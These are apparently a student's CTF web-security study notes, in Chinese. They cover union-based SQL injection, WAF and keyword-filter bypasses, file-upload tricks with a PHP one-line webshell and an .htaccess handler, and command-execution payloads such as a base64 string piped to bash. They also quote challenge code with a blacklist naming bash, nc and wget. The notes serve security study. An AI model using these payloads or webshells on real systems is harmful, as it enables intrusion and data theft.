+<p>假设到4报错，这里我们不用or ‘1’&#x3D;’1’的原因是<strong>（但是也有人用了却还是不影响，我也不理解，保险起见最好不要用）</strong>，where语句只要匹配为真，就会正常输出，而我们需要知道注入点在第几列，换句话说，我们需要知道这句代码中的where id &#x3D; 中的<strong>id</strong>在第几列，才能判断注入点。所以我们需要让where后的查询条件为假，才能输出对应列的数字。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">sql = <span class="hljs-string">&quot;SELECT * FROM users WHERE id = &#x27;<span class="hljs-variable">$id</span>&#x27;&quot;</span>;</span><br></code></pre></td></tr></table></figure>
+
+<p>假设在第2列，我们就可以在2的位置上写<strong>group_concat()</strong> ，借助‘2’这个注入点。</p>
+<p>现在开始注入，一步一步来，先判断flag在哪个库中</p>
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.schemata<br></code></pre></td></tr></table></figure>
+
+<p>就会把所有的库名显示出来（入门级的新手题很多都是在当前库，所以可以省去这一步直接database()，这是不好的，养成习惯之后可能会造成思维定式）。假设在ctf库中</p>
+<p>然后开始爆某个数据库的表名</p>
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=&#x27;ctf&#x27;; --+<br></code></pre></td></tr></table></figure>
+
+<p>知道了表名，就知道我们需要哪个表，因为我们的目的是拿到敏感信息，知道敏感信息所在表的表名，才能够进一步知道敏感信息所在的列名，进而拿到敏感信息，假设敏感信息在users表中</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">//表在当前数据库</span><br><span class="hljs-number">-1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span>; --+<br><span class="hljs-comment">//表在其他数据库</span><br><span class="hljs-number">-1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;ctf&#x27;</span>; --+<br></code></pre></td></tr></table></figure>
+
+<p>拿到了列名flag，进一步查看列中的敏感数据</p>
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-comment">//表在当前数据库</span><br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(flag),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users<br><span class="hljs-comment">//表在其他数据库</span><br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(flag),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> ctf.users<br></code></pre></td></tr></table></figure>
+
+<h3 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h3><p>今天做到了一个题非常有意思，考察了waf绕过，Web Application Firewall的官方定义我这里就不阐述了，下面是我自己的一点理解。</p>
+<p>waf会在前端与后端服务器之间设立一道墙，并且设置了一定的过滤规则，当前端向后端发送的数据包不符合waf的规则时，waf就会阻止数据包的发送，使得前端不能成功向后端发送数据包。</p>
+<p>举个例子：waf过滤了空格，那我从前端使用get方法向后端传递一个参数，</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">wllm</span>=1‘ <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>这是sql注入中非常经典的一个payload，因为参数中包含了空格，所以会被waf拦截，后端服务器也就不会接收到来自前端的wllm参数（<strong>注意，不是传送到后端被后端过滤，而是后端根本不会接收到这样的参数</strong>）</p>
+<p>通常情况下我们不会看到waf的过滤规则，只能通过构造SQL注入的payload一点一点猜，在猜测出过滤了哪些字符之后，就可以使用一些方式去绕过waf，我会随着我的学习进度来补充绕过格式的</p>
+<p>学习链接<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Vinson404/p/7253255.html">https://www.cnblogs.com/Vinson404/p/7253255.html</a></p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">//空格</span><br><span class="hljs-meta">%</span><span class="hljs-number">20</span> <span class="hljs-meta">%</span><span class="hljs-number">09</span> <span class="hljs-meta">%</span><span class="hljs-number">0</span>a <span class="hljs-meta">%</span><span class="hljs-number">0</span>b <span class="hljs-meta">%</span><span class="hljs-number">0</span>c <span class="hljs-meta">%</span><span class="hljs-number">0</span>d <span class="hljs-meta">%</span>a<span class="hljs-number">0</span> <span class="hljs-meta">%</span><span class="hljs-number">00</span> <span class="hljs-comment">/**/</span>  <span class="hljs-comment">/*!*/</span><br><span class="hljs-comment">//=</span><br>like<br><span class="hljs-comment">//#</span><br><span class="hljs-meta">%</span><span class="hljs-number">23</span><br><br></code></pre></td></tr></table></figure>
+
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>一句话木马，核心目标是成功上传一句话木马，但是题目通常会设置各种限制(比如不能上传jpg文件，不能上传php文件之类的)，一些常用的绕过技巧<a target="_blank" rel="noopener" href="https://rerizon.cn/%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%e5%b8%b8%e7%94%a8%e7%bb%95%e8%bf%87%e6%8a%80%e5%b7%a7/">https://rerizon.cn/%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%e5%b8%b8%e7%94%a8%e7%bb%95%e8%bf%87%e6%8a%80%e5%b7%a7/</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h3><p>很好处理，直接F12禁用js即可</p>
+<h3 id="服务器验证"><a href="#服务器验证" class="headerlink" title="服务器验证"></a>服务器验证</h3><h4 id="mime验证"><a href="#mime验证" class="headerlink" title="mime验证"></a>mime验证</h4><p>在txt文件中写入一句话木马之后，将文件后缀改为**.jpg（具体后缀根据实际情况更改）<strong>上传之后要用burpsuit抓包，然后找到上传的</strong>.jpg<strong>文件，把后缀名改回</strong>.php**，因为只有上传了php文件，网站才会执行这句木马，这时才可以用蚁剑连接，查看网站的文件。</p>
+<h4 id="文件头验证"><a href="#文件头验证" class="headerlink" title="文件头验证"></a>文件头验证</h4><p>一般绕过文件头验证都会使用GIF的文件头也就是“GIF89a”</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h4><ul>
+<li>大小写绕过 windows对大小写不敏感，所以上传大小写混写的php进行绕过</li>
+<li>重写绕过: 服务端将黑名单的后缀名替换掉，可以上传.phphpp后缀，替换后就成了.php </li>
+<li>特殊可解析后缀绕过： 黑名单规则不严谨，在某些特定环境中某些特殊后缀仍会被当作php文件解析 php、php2、php3、php4、php5、php6、php7、pht、phtm、phtml等</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"> @<span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;cmd&#x27;</span>]); </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h4><ul>
+<li>%00截断、0x00截断 </li>
+<li>图片马绕过 </li>
+<li>条件竞争绕过</li>
+</ul>
+<p>这里重点说下条件竞争，前提是服务器是先上传再检测。有问题的删除，这时候就可以<strong>先抓一个上传包</strong>，然后用bp疯狂上传生成马的马（套娃了），比如 <code>file_put_contents(&#39;2.php&#39;,&#39;&#39;)；</code> bp这边疯狂上传，再用python或者还是bp去疯狂访问这个马，还是照应了名字：”条件竞争“，就是在服务器检测文件删除之前访问，生成真正的马。 这里重点说了php的马，jsp和asp同理，这里要提一句的是今年的河南省金盾信安杯S3的一道upload题目，上传压缩包会自动解压，考了路径穿越，也就是把压缩包名改成..&#x2F;xxx的格式将压缩包解压到网站根目录</p>
+<p>如果蚁剑发现的是假flag，也可以去lib文件处打开终端，然后<code> printenv</code> 打印环境变量(暂时不懂此方法的思路)</p>
+<h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>.htaccess文件(或者”分布式<strong>配置文件</strong>“）,全称是Hypertext Access(<strong>超文本入口</strong>)。提供了针对目录改变配置的方法。即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p>
+<p> 概述来说，htaccess文件是<strong>Apache</strong>服务器（你可以F12查看当前网站服务器）中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。 3、 笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p>
+<p>基于htaccess的这种特质，我们可以利用上传htaccess文件来改变网站设置，实现文件上传攻击</p>
+<p>htaccess基本配置</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;FilesMatch <span class="hljs-string">&quot;muma.jpg&quot;</span>&gt;   <span class="hljs-regexp">//</span>代表只匹配<span class="hljs-string">&#x27;muma.jpg&#x27;</span><br>Sethandler application<span class="hljs-regexp">/x-httpd-php   /</span>/用该服务器来解析muma.jpg文件，不管是什么文件都会按照php文件执行<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure>
+
+<p>在文件上传注入点选择上传.htaccess文件，然后bp抓包，在bp中修改content-type为image&#x2F;jepg，send之后再次上传muma.jpg，再次bp抓包然后就是最基本的content-type改为php，使其能在后端执行代码，蚁剑连接</p>
+<h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>Remote Code Execute远程代码执行**因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=213101396&content_type=Article&match_order=1&q=%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E&zhida_source=entity">远程代码执行漏洞</a>。传入php代码到执行函数的变量，客户端可控，并且没有做严格的过滤，攻击者可以随意输入他想执行的代码，并且这些代码在服务端执行。</p>
+<p>rce是向网页后端注入代码，所以通常是php代码，而php代码本身是不能获得网页目录下的文件的，为了获取到网页后端的文件（<strong>对应到现实就是你拿到了网站的根目录下的所有信息，并且可以执行任意恶意代码</strong>）需要借助一些命令执行函数</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">//执行外部程序，把执行结果逐行输出到浏览器，并返回最后一行输出，允许直接运行系统命令 → 可被攻击者用来执行任意命令</span><br><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">()</span></span><br><span class="hljs-comment">//类似 system()，但它直接把执行结果的原始二进制输出显示出来（常用于输出二进制数据）。同样允许执行任意命令，危害与 system() 类似</span><br><span class="hljs-function"><span class="hljs-title">passthru</span><span class="hljs-params">()</span></span><br>执行外部程序，把输出的每一行保存到数组 <span class="hljs-variable">$output</span> 中，返回最后一行的结果。不会直接输出到浏览器，但依然能运行任意系统命令。<br><span class="hljs-function"><span class="hljs-title">exec</span><span class="hljs-params">()</span></span><br>执行命令并返回完整的输出结果（字符串形式）。相比 <span class="hljs-built_in">exec</span>() 更方便获取输出，风险同样高。<br><span class="hljs-function"><span class="hljs-title">shell_exec</span><span class="hljs-params">()</span></span><br>打开一个进程文件指针，可以像操作文件一样读写命令的输入输出。不仅能执行命令，还能与进程进行交互（例如写入数据），危险性更高。<br><span class="hljs-function"><span class="hljs-title">popen</span><span class="hljs-params">()</span></span><br>比 <span class="hljs-built_in">popen</span>() 更底层更强大，允许同时控制进程的输入、输出、错误流。可被用来构造复杂的攻击场景，危险性极高。<br><span class="hljs-function"><span class="hljs-title">proc_open</span><span class="hljs-params">()</span></span><br>替换当前 PHP 进程为指定的程序（类似 Linux 下的 exec 系统调用）。PHP 进程本身会被替换 → 直接执行任意程序，危害大。<br><span class="hljs-function"><span class="hljs-title">pcntl_exec</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure>
+
+<p>除此之外，一些windows命令拼接方式也十分重要</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">“|”:管道符，前面命令标准输出，后面命令的标准输入。例如：<span class="hljs-keyword">help</span> |more<br>“&amp;” <span class="hljs-keyword">command</span>A &amp; <span class="hljs-keyword">command</span>B 先运行命令A，然后运行命令B<br>“||” <span class="hljs-keyword">command</span>A || <span class="hljs-keyword">command</span>B 运行命令A，如果失败则运行命令B<br>“&amp;&amp;” <span class="hljs-keyword">command</span>A &amp;&amp; <span class="hljs-keyword">command</span>B 运行命令A，如果成功则运行命令B<br></code></pre></td></tr></table></figure>
+
+<p>网站开发人员也不会随便让你打，通常会设置一些匹配词，一旦匹配上了就会检测到危险命令</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$url</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;</span>,<span class="hljs-variable">$url</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you can&#x27;t use this.&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can you see anything?&quot;</span>;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$url</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>rce在实战中的用处非常之广，变化非常多，是最常见的漏洞之一，在这里系统的说完是不可能的，所以我会将做题时遇到的所有小技巧全都写在这里。</p>
+<h3 id="php字符被过滤"><a href="#php字符被过滤" class="headerlink" title="php字符被过滤"></a>php字符被过滤</h3><p>如果php被过滤了，我们可以使用短标签绕过。常见的php标签为<code>&lt;?php ?&gt;;</code>，如果php字符被过滤了，可以用短标签<code>&lt;?= ?&gt;;</code></p>
+<p>可以再举个栗子：system字符被过滤</p>
+<p>反引号 &#96; 可以直接执行命令，需要搭配echo()函数来输出回显。</p>
+<p>然后灵活贯通，结合上面两种方式构造一个简洁的命令执行语句。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;<span class="hljs-string">?=</span>echo <span class="hljs-string">`ls /`</span><span class="hljs-string">?&gt;</span>;<br></code></pre></td></tr></table></figure>
+
+<h3 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h3><p>常见绕过方式有利用URL编码：%20、%09（tab）</p>
+<p>还有利用<code>$IFS$9</code>、<code>$IFS$1</code>等内部域分隔符，可以看这篇文章[<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/6e09a0996d9c">【shell】IFS和$*变量 - 简书 (jianshu.com)</a>]</p>
+<p>{}也可以，比如这样{cat,flag}</p>
+<p><strong>注</strong>：一定要与sql注入中的空格绕过区分开，这里的空格绕过基本都是<strong>shell</strong>的绕过，在shell中会把这里的字符当成空格，但是在sql中不会</p>
+<h3 id="某些关键字被过滤"><a href="#某些关键字被过滤" class="headerlink" title="某些关键字被过滤"></a>某些关键字被过滤</h3><p>为了防止直接<code>cat /flag</code>，很多题目就把一些函数名称过滤掉。但是绕过方法有很多，选一个适合的就好。</p>
+<h4 id="常见的编码绕过：base64编码绕过"><a href="#常见的编码绕过：base64编码绕过" class="headerlink" title="常见的编码绕过：base64编码绕过"></a>常见的编码绕过：base64编码绕过</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IC9mbGFn&quot;</span>|<span class="hljs-built_in">base64</span> -d|bash     //cat /flag<br></code></pre></td></tr></table></figure>
+
+<h4 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ph<span class="hljs-string">&quot;&quot;</span>p  <span class="hljs-operator">=</span>&gt;  php<br>ca<span class="hljs-string">&quot;&quot;</span>t  <span class="hljs-operator">=</span>&gt;  cat<br></code></pre></td></tr></table></figure>
+
+<h4 id="偶读拼接绕过"><a href="#偶读拼接绕过" class="headerlink" title="偶读拼接绕过"></a>偶读拼接绕过</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?ip=<span class="hljs-number">192.168</span>.<span class="hljs-number">0.1</span>;a=l;b=s;<span class="hljs-variable">$a</span><span class="hljs-variable">$b</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="反斜杠-绕过"><a href="#反斜杠-绕过" class="headerlink" title="反斜杠 \ 绕过"></a>反斜杠 \ 绕过</h4><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript">ca<span class="hljs-string">\t</span> =&gt; cat<br>fl<span class="hljs-string">\ag</span> =&gt; flag<br>ph<span class="hljs-string">\p</span> =&gt; php<br></code></pre></td></tr></table></figure>
+
+<h4 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h4><p>参考P牛的文章，大佬tql[<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)</a>]还有WHOAMI大佬的<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/279563.html">老生常谈的无字母数字 Webshell 总结 - FreeBuf网络安全行业门户</a></p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">shell</span>下可以利用.来执行任意脚本<br>Linux文件名支持用<span class="hljs-keyword">glob</span>通配符代替<br>/?url=192.168.0.1|<span class="hljs-keyword">cat</span>%09/fla?  <span class="hljs-comment">//?匹配单个字符</span><br>/?url=192.168.0.1|<span class="hljs-keyword">cat</span>%09/fla*  <span class="hljs-comment">//*匹配一长串字符</span><br></code></pre></td></tr></table></figure>
+
+<p>还有一些函数（exec()，说的就是你），本身就不带有回显，需要配合一些其他的命令，才能查看内容。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> &gt; 1.txt<br><span class="hljs-built_in">ls</span> | <span class="hljs-built_in">tee</span> 1.txt<br></code></pre></td></tr></table></figure>
+
+<p>tee命令可以在显示某函数的标准输出时，将输出同步保存至文件中，肥肠的好用</p>
+<h3 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h3><p>很多题都会过滤flag这个字符串，甚至有的题目的过滤非常严格，会匹配任意包含flag的字符串</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">preg_match(&quot;/.*f.*l.*<span class="hljs-selector-tag">a</span>.*<span class="hljs-selector-tag">g</span>.*/&quot;<br></code></pre></td></tr></table></figure>
+
+<p>.*是通配符，可以匹配任意数量的字符，所以只要按照一定的顺序出现flag这四个字母就会匹配</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">flag<br>fla\<span class="hljs-selector-tag">g</span><br>flaqljhdifg  //不管f l <span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">g</span> 中间混入了多少其他字符，只要这四个字母是按照顺序出现的就会被屏蔽<br></code></pre></td></tr></table></figure>
+
+<p>我们可以利用变量赋值的方式绕过</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">q</span><span class="hljs-operator">=</span>g<span class="hljs-comment">;tac fla$g.php  //注意，一定至少有一个变量放在末尾用来匹配g</span><br>假如是这样进行绕过<br><span class="hljs-attribute">q</span><span class="hljs-operator">=</span>a<span class="hljs-comment">;tac fl$qg.php  //注入会失败，因为会将$qg因为是一个变量</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="无字母webshell"><a href="#无字母webshell" class="headerlink" title="无字母webshell"></a>无字母webshell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wllm&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$wllm</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wllm&#x27;</span>];<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;\t&#x27;</span>,<span class="hljs-string">&#x27;\r&#x27;</span>,<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\+&#x27;</span>,<span class="hljs-string">&#x27;\[&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>,<span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\&quot;&#x27;</span>,<span class="hljs-string">&#x27;\-&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\*&#x27;</span>,<span class="hljs-string">&#x27;\?&#x27;</span>,<span class="hljs-string">&#x27;\&lt;&#x27;</span>,<span class="hljs-string">&#x27;\&gt;&#x27;</span>,<span class="hljs-string">&#x27;\=&#x27;</span>,<span class="hljs-string">&#x27;\`&#x27;</span>,];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$wllm</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);<br>    &#125;&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="hljs-variable">$wllm</span>))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$wllm</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;蔡总说：注意审题！！！&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>注入此类的过滤掉a-z，A-Z，的题，我们要做的就是根据需要利用脚本构造payload绕过。绕过有以下几种方式，随着我的学习，我会逐渐补充</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">xor绕过</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">or绕过</span><br><span class="hljs-keyword"></span>取反绕过<br>自增绕过<br></code></pre></td></tr></table></figure>
+
